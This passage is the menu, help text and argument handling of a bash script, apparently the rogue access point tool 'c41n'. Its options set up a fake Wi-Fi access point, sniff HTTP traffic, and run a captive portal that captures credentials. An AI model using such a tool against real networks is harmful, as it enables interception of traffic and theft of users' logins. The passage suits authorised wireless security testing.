+	echo -n -e "\n\n[${blue}*${default}] Starting ${blue}c41n${default} in ${blue}interactive${default} mode."
+	echo -n -e "\n[${blue}*${default}] Available ${blue}modules${default}: \n"
+	echo -n -e "\n[${blue}0${default}] ${blue}Rogue AP${default}.\n"
+	echo -n -e "\n[${blue}1${default}] ${blue}Rogue AP${default} + ${blue}HTTP traffic sniffing${default}."
+	echo -n -e "\n[${blue}2${default}] ${blue}Rogue AP${default} + ${blue}Captive Portal${default} + ${blue}credential sniffing${default}.\n"
+	echo -ne "\n[${green}+${default}] Select ${green}module${default}: "
+	read module
+	case $module in
+		0)
+			rogue
+			;;
+		1)
+			sniff
+			;;
+		2)
+			captive
+			;;
+		*)
+			echo -n -e "[${red}!${default}] Error: ${red}Unexpected input${default}. Quitting...\n"
+                        exit
+                        ;;
+	esac
+}
+
+help() {
+        splash
+        echo -e "\n\n${blue}c41n${default} is an automated Rogue Access Point setup tool."
+        echo -e "${blue}c41n${default} can be run in interactive, and quick mode.\n"
+        echo -e "To run ${blue}c41n${default} in interactive mode, use: ${green}'${default}${green}./${default}c41n${green}'${default}."
+        echo -e "\n${blue}Quick mode${default}:"
+        echo -e "\nStart ${blue}Rogue AP${default}:\n ${green}'${default}${green}./${default}c41n ${green}<${default}AP interface${green}>${default} ${green}<${default}internet connection interface${green}>${default} ${green}<${default}AP name${green}>${default} ${green}<${default}AP channel${green}>${default}${green}'${default}"
+        echo -e "Start ${blue}Rogue AP${default} + ${blue}sniffing HTTP traffic${default}:\n ${green}'${default}${green}./${default}c41n sniff ${green}<${default}AP interface${green}>${default} ${green}<${default}internet connection interface${green}>${default} ${green}<${default}AP name${green}>${default} ${green}<${default}AP channel${green}>${default}${green}'${default}"
+        echo -e "Start ${blue}Rogue AP${default} + ${blue}captive portal${default}:\n ${green}'${default}${green}./${default}c41n captive ${green}<${default}ap interface${green}>${default} ${green}<${default}internet connection interface${green}>${default} ${green}<${default}AP name${green}>${default} ${green}<${default}AP channel${green}>${default} ${green}<${default}redirection parameter${green}>${default}${green}'${default}\n"
+	echo -e "\n${blue}Redirection parameter${default}:"
+	echo -e "${blue}Redirection parameter${default} can have the following values: "
+	echo -e "	${green}0${default}: Redirects only predefined domains."
+	echo -e "	${green}1${default}: Redirects all traffic."
+	echo -e "	${green}domains_file${default}: Redirects predefined domains + domains from specified file (separated by new line).\n"
+        echo -e "\n${blue}Examples${default}:"
+        echo -e "[${blue}1${default}] Start Rogue AP on wlan0 interface, route traffic from eth0 interface, AP name: 'AP', AP channel: '1'"
+        echo -e "	${green}'${default}${green}./${default}c41n wlan0 eth0 AP 1${green}'${default}"
+	echo -e "[${blue}2${default}] Start Rogue AP and sniff HTTP traffic on wlan0 interface, route traffic from wlan1 interface, AP name: 'Access_Point', AP channel: '6'"
+	echo -e "	${green}'${default}${green}./${default}c41n sniff wlan0 wlan1 Access_Point 6${green}'${default}"
+	echo -e "[${blue}3${default}] Start Rogue AP with captive portal on wlp6s0 interface, redirect default domains and domains from custom file (/home/name/Documents/domains.txt), route traffic from eth1 interface, AP name: 'router', AP channel: '9'"
+	echo -e "	${green}'${default}${green}./${default}c41n captive wlp6s0 eth1 router 9 /home/name/Documents/domains.txt${green}'${default}\n"
+}
+
+        red='\033[0;31m'
+        green='\033[0;32m'
+        yellow='\033[0;33m'
+        blue='\033[0;34m'
+	magenta='\033[0;35m'
+	cyan='\033[0;36m'
+        default='\033[0;39m'
+	light_yellow='\033[0;93m'
+	i=1
+
+	if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
+		help
+		exit
+	fi
+
+	if [ $# -eq 0 ]; then
+		interactive_mode
+	elif [ "$1" = "sniff" ]; then
+		sniff_quick "$2" "$3" "$4" "$5"
+	elif [ "$1" = "captive" ]; then
+		captive_quick "$2" "$3" "$4" "$5" "$6"
+	elif [ "$#" = 4 ]; then
+		ap_quick "$1" "$2" "$3" "$4"
+	else
+		splash
+		echo -n -e "\n[${red}!${default}] Error: ${red}Unexpected input${default}. Quitting...\n"
+		exit 1
+	fi
